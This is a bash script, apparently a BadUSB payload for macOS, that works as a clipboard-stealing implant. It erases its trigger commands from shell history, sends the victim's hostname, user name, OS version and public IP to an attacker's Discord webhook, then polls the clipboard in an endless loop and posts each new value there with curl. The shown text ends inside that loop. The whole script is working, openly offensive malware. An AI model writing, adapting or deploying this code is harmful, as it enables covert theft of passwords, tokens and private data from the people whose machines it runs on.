#!/bin/bash
##################################################################
# Global variables
##################################################################

LAST_LOGGED_CONTENT="skibidi_clipboard"
DISCORD_WEBHOOK="$1"
SLEEP_TIME="$2"

##################################################################
# Helpers
##################################################################


# Remove the commands executed with BadUSB in order to not leave
# any trace on the victim host
clean_history() {
  sed -i '' -e :a -e '$d;N;2ba' -e 'P;D' $HISTFILE
}


# Get the content from the clipboard and return it
get_the_clipboard() {
  local CLIPBOARD=$(osascript -e "the clipboard")
  echo $CLIPBOARD
}

# Send a message inside the Discord server. Pass the message to
# send as the first argument
send_message_to_discord() {
  local MESSAGE=$1
  curl -X POST -H "Content-Type: application/json" -d "$MESSAGE" "$DISCORD_WEBHOOK"
}

# Generate a random color. This function is used to pick a color
# for the target that will be used inside every Discord embed sent
random_color() {
  local RED=$((RANDOM % 256))
  local GREEN=$((RANDOM % 256))
  local BLUE=$((RANDOM % 256))

  local DECIMAL_COLOR=$((RED * 0x010000 + GREEN * 0x000100 + BLUE * 0x000001))

  echo "$DECIMAL_COLOR"
}

# Get hostname of the current target
hostname() {
  echo $(uname -n)
}

# Get user running the script for current target in the format
# "<name> <surname> (<username>)"
username() {
  echo "$(id -F) (*$USER*)"
}

# Get execution date
current_date() {
  echo "$(date +"%a, %d %b %Y")"
}

# Get execution time
current_time() {
  echo "$(date +"%H:%M:%S")"
}

current_datetime() {
  echo "$(date +"%d-%m-%Y @ %H:%M:%S")"
}

os_version() {
  echo "$(sw_vers -productName) $(sw_vers -productVersion) ($(sw_vers -buildVersion))"
}

public_ip() {
  local IP_ADDRESS=$(curl -s -f ipinfo.io/ip)
  if [ $? -ne 0 ]; then
    echo "N.A."
  else
    echo "$IP_ADDRESS"
  fi
}

# Send an initial message to Discord server to notify that a new
# skibidi target has been found
notify_new_target_acquired() {
  local USERNAME="$(username)"
  local TARGET="$(hostname)"
  local DATETIME="$(current_datetime)"
  local OS_VERSION="$(os_version)"
  local IP_ADDRESS="$(public_ip)"

  local MESSAGE=$(cat << 'EOF'
{
  "username": "Skibidi Cameraman",
  "avatar_url": "https://image.winudf.com/v2/image1/Y29tLm1vYmluY3ViZS5jYW1lcmFtYW4udnMuc2tpYmlkaS50b2lsZXQucm9wZS53YWxscGFwZXIuVG9pbGV0Lk1vc3Rlcl9pY29uXzE3MDA2NDAwODJfMDY3/icon.png?w=156&fakeurl=1",
  "embeds": [
    {
      "title": "New target aquired!",
      "color": $TARGET_COLOR,
      "fields": [
        {
          "name": "📅 Acquisition date:",
          "value": "$DATETIME",
          "inline": false
        },
        {
          "name": "🎨 Color used:",
          "value": "$TARGET_COLOR",
          "inline": false
        },
        {
          "name": "🌐 Public IP address:",
          "value": "$IP_ADDRESS",
          "inline": false
        },
        {
          "name": "🖥️ Hostname:",
          "value": "$TARGET",
          "inline": true
        },
        {
          "name": "ℹ️ OS Version:",
          "value": "$OS_VERSION",
          "inline": true
        },
        {
          "name": "👤 User:",
          "value": "$USERNAME",
          "inline": false
        }
      ],
      "author": {
        "name": "🚽 skibidi_clipboard_payload 🚽"
      }
    }
  ]
}
EOF
)
  MESSAGE=$(echo "$MESSAGE" | sed \
  -e "s|\$DATETIME|$DATETIME|g" \
  -e "s|\$TARGET_COLOR|$TARGET_COLOR|g" \
  -e "s|\$TARGET|$TARGET|g" \
  -e "s|\$USERNAME|$USERNAME|g" \
  -e "s|\$IP_ADDRESS|$IP_ADDRESS|g" \
  -e "s|\$OS_VERSION|$OS_VERSION|g")

  send_message_to_discord "$MESSAGE"
}

# Exfiltrate $LAST_LOGGED_CONTENT to Discord server
exfiltrate_content() {
  local USERNAME="$(username)"
  local TARGET="$(hostname)"
  local DATE="$(current_date)"
  local TIME="$(current_time)"

  local MESSAGE=$(cat << 'EOF'
{
  "username": "Skibidi Cameraman",
  "avatar_url": "https://image.winudf.com/v2/image1/Y29tLm1vYmluY3ViZS5jYW1lcmFtYW4udnMuc2tpYmlkaS50b2lsZXQucm9wZS53YWxscGFwZXIuVG9pbGV0Lk1vc3Rlcl9pY29uXzE3MDA2NDAwODJfMDY3/icon.png?w=156&fakeurl=1",
  "embeds": [
    {
      "title": "New clipboard loot acquired",
      "color": $TARGET_COLOR,
      "fields": [
        {
          "name": "📅 Date:",
          "value": "$DATE",
          "inline": true
        },
        {
          "name": "🕙 Time:",
          "value": "$TIME",
          "inline": true
        },
        {
          "name": "🖥️ Target:",
          "value": "$TARGET",
          "inline": false
        },
        {
          "name": "👤 User:",
          "value": "$USERNAME",
          "inline": false
        },
        {
          "name": "📝 Clipboard content:",
          "value": "```\n$LAST_LOGGED_CONTENT\n```",
          "inline": false
        }
      ],
      "author": {
        "name": "🚽 skibidi_clipboard_payload 🚽"
      }
    }
  ]
}
EOF
)
  MESSAGE=$(echo "$MESSAGE" | sed \
  -e "s|\$DATE|$DATE|g" \
  -e "s|\$TIME|$TIME|g" \
  -e "s|\$TARGET_COLOR|$TARGET_COLOR|g" \
  -e "s|\$TARGET|$TARGET|g" \
  -e "s|\$USERNAME|$USERNAME|g" \
  -e "s|\$LAST_LOGGED_CONTENT|$LAST_LOGGED_CONTENT|g")

  send_message_to_discord "$MESSAGE"
}

##################################################################
# Main loop
##################################################################

# Clear evidence by removing trigger commands from shell history
clean_history

# Pick a random color for Discord's embed that will be used
# throughout the execution
TARGET_COLOR=$(random_color)

# Notify target acquired to Discord server
notify_new_target_acquired

# Keep logging clipboard content until the user logout or the
# system is rebooted
while true
do
  CLIPBOARD_CONTENT=$(get_the_clipboard)

  # Check if the clipboard content has changed from last execution
  if [ "$LAST_LOGGED_CONTENT" != "$CLIPBOARD_CONTENT" ]; then
    # Exfiltrate the content to Discord server
    LAST_LOGGED_CONTENT=$CLIPBOARD_CONTENT
    exfiltrate_content
  fi
  # Sleep for $SLEEP_TIME seconds and repeat again
  sleep $SLEEP_TIME